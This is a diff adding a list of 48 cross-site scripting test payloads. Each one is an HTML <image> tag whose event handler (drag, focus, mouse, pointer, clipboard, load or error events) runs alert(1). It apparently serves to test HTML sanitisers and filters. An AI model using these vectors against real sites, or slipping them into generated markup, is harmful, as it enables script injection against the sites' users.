@@ -1,0 +1,48 @@
+<image draggable="true" ondrag="alert(1)">test</image>
+<image draggable="true" ondragend="alert(1)">test</image>
+<image draggable="true" ondragenter="alert(1)">test</image>
+<image draggable="true" ondragleave="alert(1)">test</image>
+<image draggable="true" ondragstart="alert(1)">test</image>
+<image id=x tabindex=1 onactivate=alert(1)></image>
+<image id=x tabindex=1 onbeforeactivate=alert(1)></image>
+<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>
+<image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>
+<image id=x tabindex=1 onfocus=alert(1)></image>
+<image id=x tabindex=1 onfocusin=alert(1)></image>
+<image onafterscriptexecute=alert(1)><script>1</script>
+<image onbeforecopy="alert(1)" contenteditable>test</image>
+<image onbeforecut="alert(1)" contenteditable>test</image>
+<image onbeforepaste="alert(1)" contenteditable>test</image>
+<image onbeforescriptexecute=alert(1)><script>1</script>
+<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>
+<image onclick="alert(1)">test</image>
+<image oncontextmenu="alert(1)">test</image>
+<image oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<image oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<image ondblclick="alert(1)" autofocus tabindex=1>test</image>
+<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>
+<image onkeydown="alert(1)" contenteditable>test</image>
+<image onkeypress="alert(1)" contenteditable>test</image>
+<image onkeyup="alert(1)" contenteditable>test</image>
+<image onmousedown="alert(1)">test</image>
+<image onmouseenter="alert(1)">test</image>
+<image onmouseleave="alert(1)">test</image>
+<image onmousemove="alert(1)">test</image>
+<image onmouseout="alert(1)">test</image>
+<image onmouseover="alert(1)">test</image>
+<image onmouseup="alert(1)">test</image>
+<image onmousewheel=alert(1)>requires scrolling
+<image onpaste="alert(1)" contenteditable>test</image>
+<image onpointerdown=alert(1)>XSS</image>
+<image onpointerenter=alert(1)>XSS</image>
+<image onpointerleave=alert(1)>XSS</image>
+<image onpointermove=alert(1)>XSS</image>
+<image onpointerout=alert(1)>XSS</image>
+<image onpointerover=alert(1)>XSS</image>
+<image onpointerrawupdate=alert(1)>XSS</image>
+<image onpointerup=alert(1)>XSS</image>
+<image src/onerror=alert(1)>
+<image src=validimage.png onload=alert(1)>
+<image src=validimage.png onloadend=alert(1)>
+<image src=validimage.png onloadstart=alert(1)>
+<image srcset=1 onerror=alert(1)>
